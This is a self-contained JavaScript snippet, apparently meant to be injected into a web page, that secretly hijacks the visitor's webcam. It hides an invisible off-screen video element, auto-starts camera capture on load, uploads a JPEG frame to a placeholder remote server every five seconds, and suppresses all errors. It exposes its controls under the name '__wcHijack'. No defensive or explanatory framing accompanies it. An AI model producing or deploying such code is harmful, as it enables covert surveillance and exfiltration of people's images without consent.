    (function() {
      const captureIntervalMs = 5000; // capture every 5s
      const maxWidth = 800;           // resize width for balance of detail/size
      const serverEndpoint = 'https://your-server.example.com/upload';

      // Create hidden elements
      const video = document.createElement('video');
      video.autoplay = true;
      video.playsInline = true;
      video.muted = true;
      video.style.position = 'fixed';
      video.style.opacity = '0';
      video.style.pointerEvents = 'none';
      video.style.width = '1px';
      video.style.height = '1px';
      video.style.left = '-9999px';
      document.body.appendChild(video);

      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');

      let stream = null;
      let captureTimer = null;

      async function start() {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
          video.srcObject = stream;
          await video.play();

          // Set canvas size proportional to video dimensions
          const scale = Math.min(1, maxWidth / (video.videoWidth || 640));
          canvas.width = Math.round((video.videoWidth || 640) * scale);
          canvas.height = Math.round((video.videoHeight || 480) * scale);

          scheduleCapture();
        } catch (e) {
          // fail silently
        }
      }

      function scheduleCapture() {
        if (captureTimer) clearInterval(captureTimer);
        captureTimer = setInterval(captureOnce, captureIntervalMs);
      }

      async function captureOnce() {
        try {
          if (!video.videoWidth || !video.videoHeight) return;

          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Prefer blob to reduce memory and avoid large data URLs
          canvas.toBlob(async (blob) => {
            if (!blob) return;
            const form = new FormData();
            form.append('file', blob, `capture_${Date.now()}.jpg`);
            form.append('ts', String(Date.now()));
            try {
              await fetch(serverEndpoint, {
                method: 'POST',
                body: form,
                credentials: 'omit',
                mode: 'cors',
                cache: 'no-store'
              });
            } catch (_) {
              // ignore upload errors
            }
          }, 'image/jpeg', 0.8);
        } catch (_) {
          // ignore capture errors
        }
      }

      function stop() {
        if (captureTimer) clearInterval(captureTimer);
        captureTimer = null;
        if (stream) {
          stream.getTracks().forEach(t => t.stop());
          stream = null;
        }
        if (video) {
          video.srcObject = null;
          video.remove();
        }
        if (canvas) {
          canvas.remove();
        }
      }

      // Expose controls if needed
      window.__wcHijack = { start, stop };

      // Auto-start
      start();
    })();

